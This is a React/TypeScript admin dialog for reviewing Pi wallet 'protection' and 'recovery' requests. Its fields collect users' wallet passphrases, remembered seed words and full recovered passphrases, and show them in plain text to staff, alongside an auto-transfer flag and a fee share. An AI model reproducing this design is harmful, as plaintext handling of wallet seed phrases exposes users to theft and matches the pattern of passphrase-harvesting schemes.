"use client"

import React, { useState } from "react"
import {
  CheckCircle,
  Clock,
  AlertTriangle,
  Key,
  Shield,
  Wallet,
  Lock,
  Unlock,
  Hash,
  CreditCard,
  Calendar,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"
import { Badge } from "@/components/ui/badge"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Label } from "@/components/ui/label"
import { Separator } from "@/components/ui/separator"

// Define the request interface
interface IRequest {
  requestType: "protection" | "recovery"
  email: string
  user: {
    username: string
    _id: string
  }
  phoneNumber: string
  status: "pending" | "processing" | "completed" | "failed"
  country: string
  publicKey: string
  note: string
  createdAt: Date
  updatedAt: Date
  recoveredPassphrase: string
  wordsRemembered: string
  piBalance: number
  piUnlockTime: Date
  walletPassphrase: string
  mainnetWalletAddress: string
  _id: string
  autoTransferEnabled: boolean
  statusHistory?: Array<{ status: string; timestamp: Date }>
}

interface EditRequestDialogProps {
  isOpen: boolean
  onClose: () => void
  request: IRequest
  mode: "view" | "edit"
  onUpdateStatus?: (requestId: string, newStatus: string,type:"recovery"|"protection") => void
  setPassphrase: React.Dispatch<React.SetStateAction<string>>
  passphrase: string
  setRejectReason: React.Dispatch<React.SetStateAction<string>>
  rejectReason: string
  amount:number;
  setAmount:React.Dispatch<React.SetStateAction<number>>
}

export function EditRequestDialog({ isOpen, onClose, request, mode, onUpdateStatus,setRejectReason,rejectReason ,amount,setAmount,passphrase,setPassphrase}: EditRequestDialogProps) {
  const [status, setStatus] = useState(request?.status || "")
  const [isSubmitting, setIsSubmitting] = useState(false)


  const formatDate = (dateString: Date) => {
    if (!dateString) return "N/A"

    const date = new Date(dateString)
    const options: Intl.DateTimeFormatOptions = {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      hour12: false,
    }
    return new Intl.DateTimeFormat("en-GB", options).format(date)
  }

  const getStatusBadge = (status: string) => {
    switch (status) {
      case "completed":
        return (
          <Badge className="bg-green-500">
            <CheckCircle className="mr-1 h-3 w-3" /> Completed
          </Badge>
        )
      case "pending":
        return (
          <Badge className="bg-amber-500">
            <Clock className="mr-1 h-3 w-3" /> Pending
          </Badge>
        )
      case "processing":
        return (
          <Badge className="bg-blue-500">
            <Clock className="mr-1 h-3 w-3" /> Processing
          </Badge>
        )
      case "failed":
        return (
          <Badge variant="destructive">
            <AlertTriangle className="mr-1 h-3 w-3" /> Failed
          </Badge>
        )
      default:
        return <Badge>{status}</Badge>
    }
  }

  const formatPiBalance = (balance: number) => {
    if (balance === undefined || balance === null) return "N/A"
    return balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " π"
  }

  const handleSubmit = async () => {
    if (!request || !onUpdateStatus) return

    setIsSubmitting(true)
    try {
      await onUpdateStatus(request._id, status,request.requestType)

      
    //   toast({
    //     title: "Status updated",
    //     description: `Request ${request._id} status has been updated to ${status}`,
    //   })
      onClose()
    } catch (error) {
    //   toast({
    //     title: "Error updating status",
    //     description: "There was a problem updating the request status.",
    //     variant: "destructive",
    //   })
    } finally {
      setIsSubmitting(false)
    }
  }

  if (!request) return null

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-[600px] max-h-[80vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle>
            {mode === "view" ? "Request Details" : "Edit Request"}
            <span className="ml-2 text-sm font-normal text-muted-foreground">#{request._id}</span>
          </DialogTitle>
          <DialogDescription>
            {request.requestType === "recovery" ? (
              <div className="flex items-center">
                <Key className="h-4 w-4 mr-1 text-primary" />
                <span>Recovery Request</span>
              </div>
            ) : (
              <div className="flex items-center">
                <Shield className="h-4 w-4 mr-1 text-primary" />
                <span>Protection Request</span>
              </div>
            )}
          </DialogDescription>
        </DialogHeader>

        <Tabs defaultValue="details" className="w-full">
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="details">Details</TabsTrigger>
            <TabsTrigger value="history">History</TabsTrigger>
          </TabsList>

          <TabsContent value="details" className="space-y-4 py-4">
            {/* Basic Information */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label className="text-muted-foreground">User</Label>
                <p className="font-medium">{request.user.username}</p>
              </div>
              <div>
                <Label className="text-muted-foreground">Email</Label>
                <p className="font-medium">{request.email}</p>
              </div>
              <div>
                <Label className="text-muted-foreground">Date Created</Label>
                <p className="font-medium">{formatDate(request.createdAt)}</p>
              </div>
              <div>
                <Label className="text-muted-foreground">Current Status</Label>
                <div className="mt-1">{getStatusBadge(request.status)}</div>
              </div>
            </div>

            <Separator className="my-4" />

            {/* Request Type Specific Information */}
            <div className="space-y-4">
              <h3 className="text-lg font-medium">
                {request.requestType === "protection" ? "Protection Details" : "Recovery Details"}
              </h3>

              {request.requestType === "protection" ? (
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label className="text-muted-foreground flex items-center">
                      <CreditCard className="h-4 w-4 mr-1" /> Pi Balance
                    </Label>
                    <p className="font-medium">{formatPiBalance(request.piBalance)}</p>
                  </div>
                  <div>
                    <Label className="text-muted-foreground flex items-center">
                      <Calendar className="h-4 w-4 mr-1" /> Unlock Time
                    </Label>
                    <p className="font-medium">{formatDate(request.piUnlockTime)}</p>
                  </div>
                  <div className="col-span-2">
                    <Label className="text-muted-foreground flex items-center">
                      <Wallet className="h-4 w-4 mr-1" /> Mainnet Wallet Address
                    </Label>
                    <p className="font-medium break-all bg-muted p-2 rounded-md mt-1 text-sm">
                      {request.mainnetWalletAddress || "Not provided"}
                    </p>
                  </div>
                  {request.walletPassphrase && (
                    <div className="col-span-2">
                      <Label className="text-muted-foreground flex items-center">
                        <Lock className="h-4 w-4 mr-1" /> Wallet Passphrase
                      </Label>
                      <p className="font-medium break-all bg-muted p-2 rounded-md mt-1 text-sm">
                        {request.walletPassphrase}
                      </p>
                    </div>
                  )}
                </div>
              ) : (
                <div className="grid grid-cols-2 gap-4">
                  {request.wordsRemembered && (
                    <div className="col-span-2">
                      <Label className="text-muted-foreground flex items-center">
                        <Key className="h-4 w-4 mr-1" /> Words Remembered
                      </Label>
                      <p className="font-medium break-all bg-muted p-2 rounded-md mt-1 text-sm">
                        {request.wordsRemembered}
                      </p>
                    </div>
                  )}
                  <div className="col-span-2">
                    <Label className="text-muted-foreground flex items-center">
                      <Hash className="h-4 w-4 mr-1" /> Public Key
                    </Label>
                    <p className="font-medium break-all bg-muted p-2 rounded-md mt-1 text-sm">
                      {request.publicKey || "Not provided"}
                    </p>
                  </div>
                  {request.recoveredPassphrase && (
                    <div className="col-span-2">
                      <Label className="text-muted-foreground flex items-center">
                        <Unlock className="h-4 w-4 mr-1" /> Recovered Passphrase
                      </Label>
                      <p className="font-medium break-all bg-muted p-2 rounded-md mt-1 text-sm">
                        {request.recoveredPassphrase}
                      </p>
                    </div>
                  )}
                </div>
              )}
            </div>

            {request.note && (
              <>
                <Separator className="my-4" />
                <div>
                  <Label className="text-muted-foreground">Notes</Label>
                  <p className="mt-1 whitespace-pre-wrap bg-muted p-2 rounded-md text-sm">{request.note}</p>
                </div>
              </>
            )}

            {mode === "edit" && (
              <div className="pt-4 border-t mt-4">
                <Label htmlFor="status">Update Status</Label>
                <Select value={status} onValueChange={setStatus as never}>
                  <SelectTrigger className="w-full mt-1">
                    <SelectValue placeholder="Select new status" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="pending">Pending</SelectItem>
                    <SelectItem value="processing">Processing</SelectItem>
                    <SelectItem value="completed">Completed</SelectItem>
                    <SelectItem value="failed">Failed</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            )}
            {status === "failed" && (
              <div className="pt-4 border-t mt-4">
                <Label htmlFor="rejectReason">Reason for Failure or For Rejecting This Case</Label>
                <textarea
                  id="rejectReason"
                  required
                  className="w-full mt-1 p-2 border rounded-md"
                  placeholder="Please provide a reason for rejection"
                  rows={3}
                  value={rejectReason}
                  onChange={(e) => setRejectReason(e.target.value)}
                />
              </div>
            )}
            {status === "completed" && (
              <div>
                <div className="pt-4 border-t mt-4">
                <Label htmlFor="amount">Amount of pi Earned(25% of platform fee)</Label>
                <input
                  id="amount"
                  required
                  type="number"
                  className="w-full mt-1 p-2 border rounded-md"
                  placeholder="Enter amount"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value as never)}
                />
              </div>
              {
                request.requestType === "recovery" && (
                  <div className="pt-4 border-t mt-4">
                <Label htmlFor="rejectReason">Enter Full Recovered Passphrase</Label>
                <textarea
                  id="passphrase"
                  required
                  className="w-full mt-1 p-2 border rounded-md"
                  placeholder="Enter Full recovered passphrase 24 words"
                  rows={3}
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                />
              </div>
                )
              }
              </div>
            )}
          </TabsContent>

          <TabsContent value="history" className="space-y-4 py-4">
            <div className="space-y-4">
              <p className="text-sm text-muted-foreground">Request status history</p>
              <div className="space-y-2">
                {request.statusHistory && request.statusHistory.length > 0 ? (
                  request.statusHistory.map((history: any, index: number) => (
                    <div key={index} className="flex justify-between border-b pb-2">
                      <div className="flex items-center">{getStatusBadge(history.status)}</div>
                      <div className="text-sm text-muted-foreground">{formatDate(history.timestamp)}</div>
                    </div>
                  ))
                ) : (
                  <p>No history available</p>
                )}
              </div>
            </div>
          </TabsContent>
        </Tabs>

        <DialogFooter>
          {mode === "edit" ? (
            <>
              <Button variant="outline" onClick={onClose}>
                Cancel
              </Button>
              <Button onClick={handleSubmit} disabled={isSubmitting}>
                {isSubmitting ? "Updating..." : "Update Status"}
              </Button>
            </>
          ) : (
            <Button onClick={onClose}>Close</Button>
          )}
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}

